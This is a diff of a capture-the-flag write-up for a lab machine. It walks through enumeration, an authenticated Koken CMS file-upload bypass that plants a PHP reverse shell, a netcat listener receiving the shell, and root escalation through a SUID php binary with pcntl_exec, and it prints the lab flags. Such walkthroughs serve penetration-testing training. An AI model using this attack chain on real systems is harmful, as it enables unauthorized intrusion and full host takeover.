@@ -1,3 +1,9 @@
+---
+custom_edit_url: null
+pagination_next: null
+pagination_prev: null
+---
+
 ## Enumeration
 ### NMAP scan
 
@@ -55,7 +61,6 @@ Nmap done: 1 IP address (1 host up) scanned in 313.07 seconds
 
 There are five open ports:
 
-
 | Port | Service     |
 | ---- | ----------- |
 | 22   | ssh         |
@@ -64,11 +69,11 @@ There are five open ports:
 | 445  | netbios-ssn |
 | 8000 | http        |
 
-## Port 80 - HTTP
+### Port 80 - HTTP
 
 Let's enumerate port 80 through our browser.
 
-![[1 165.png]]
+![1](https://github.com/Kunull/Write-ups/assets/110326359/71a3bc51-20dc-45c4-abdf-3a33cfd0651a)
 
 As we can see there is nothing of importance here.
 
@@ -84,8 +89,7 @@ server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration:
 :: Progress: [220560/220560] :: Job [1/1] :: 623 req/sec :: Duration: [0:06:21] :: Errors: 0 ::
 ```
 
-
-## Port 135 - SMB
+### Port 135 - SMB
 
 We can map out the SMB shares on the target using `smbclient`.
 
@@ -154,10 +158,13 @@ This tells us some potential credentials.
 
 ## Port 8000 - HTTP
 
-![[2 173.png]]
+Let's enumerate port 8000 through our browser.
 
-![[3 154.png]]
+![2](https://github.com/Kunull/Write-ups/assets/110326359/b468e471-1ba8-4e4a-a930-7dc2226f0f9a)
 
+![3](https://github.com/Kunull/Write-ups/assets/110326359/8f0975f8-ee2d-4d90-8be8-bedad4c2c169)
+
+&nbsp;
 
 ## Exploitation
 ### Logging in to the Koken dashboard
@@ -169,6 +176,8 @@ This tells us some potential credentials.
 
 ### Searching for relevant exploit using Searchsploit
 
+Now that we know theere is a Kokwn CMS running on port 8000, we can search for an exploit using Searchsploit.
+
 ```
 $ searchsploit koken                                                                                       
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -178,6 +187,8 @@ Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)                       
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+
+Let's check what the exploit instructs us to do.
 
 ```
 $ cat 48706.txt   
@@ -260,3 +271,135 @@ Content-Type: image/jpeg
 ```
 
 ### Uploading a php
+Intead of the PHP shell code given to us, we will be using the `/usr/share/webshells/php/php-reverse-shell.php`.
+
+![9](https://github.com/Kunull/Write-ups/assets/110326359/13c53dc9-a0c1-4f8b-9677-e428766f756d)
+
+Once we have saved the code to `image.php.jpg`, we can upload the file through the CMS dashboard.
+
+While uploading the file, we have to proxy the traffic through Burpsuite.
+
+![4](https://github.com/Kunull/Write-ups/assets/110326359/4d0e241b-67df-4c90-9533-ff30ebc8ba03)
+
+The request must be logged in the `Proxy > HTTP history`.
+
+![5](https://github.com/Kunull/Write-ups/assets/110326359/f6c2e3ce-e892-4e60-9df2-f3194c3afdff)
+
+Next, we have to forward the request to the `Repeater`.
+
+![6](https://github.com/Kunull/Write-ups/assets/110326359/1c505d79-0443-403b-820f-5a1d79b3d2b0)
+
+Once in the `Repeater`, we can change the file name to `revshell.php` and forward the request.
+
+Now, there should be two files visible on the dashboard: `image.php.jpg` and `revshell.php`.
+
+![7](https://github.com/Kunull/Write-ups/assets/110326359/7792cb8a-02e7-4ad0-a53e-6e6155f2ef04)
+
+If we look at the `SITE > Link`, we can see where the `revshell.php` file is located.
+
+### Gaining a reverse shell
+
+Let's use `nc` to set up listener.
+
+```
+$ nc -nlvp 9999                         
+listening on [any] 9999 ...
+```
+
+Now we can visit the `revshell.php` file through the browser.
+
+![10](https://github.com/Kunull/Write-ups/assets/110326359/444d3da7-3980-4e07-be0a-9655e2254573)
+
+Let's check back on the listener.
+
+```
+$ nc -nlvp 9999                         
+listening on [any] 9999 ...
+connect to [192.168.45.216] from (UNKNOWN) [192.168.222.76] 59092
+Linux photographer 4.15.0-115-generic #116~16.04.1-Ubuntu SMP Wed Aug 26 17:36:48 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 01:53:13 up  1:54,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+
+&nbsp;
+
+## Post Exploitation
+
+### Spawning a `tty` shell
+
+We can now upgrade this shell to a tty shell using Python.
+
+```
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@photographer:/$
+```
+
+### local.txt
+
+Let's cat the local.txt flag.
+
+```
+www-data@photographer:/home/daisa$ cat local.txt  
+cat local.txt
+0efd95e22a381cfe8fb8ca1f970e8f34
+```
+
+### Privilege escalation
+
+We can use the find command to search for files on the system where the setuid bit is set.
+
+```
+www-data@photographer:/$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/php7.2
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/chfn
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/su
+```
+
+We can now use on of these files to escalate our privilege.
+
+Let's go to GTFOBins to search for an exploit for the `php` utility.
+
+![11](https://github.com/Kunull/Write-ups/assets/110326359/574dcd86-8702-4397-864e-50f8d0debcdc)
+
+```
+www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
+<sr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"                         
+bash-4.3# whoami
+whoami
+root
+```
+
+We are now the `root` user.
+
+### proof.txt
+
+We can now cat the proof.txt flag.
+
+```
+bash-4.3# cat /root/proof.txt
+cat /root/proof.txt
+bdd6aa20288e19952cdafba21fd82dd9
+```
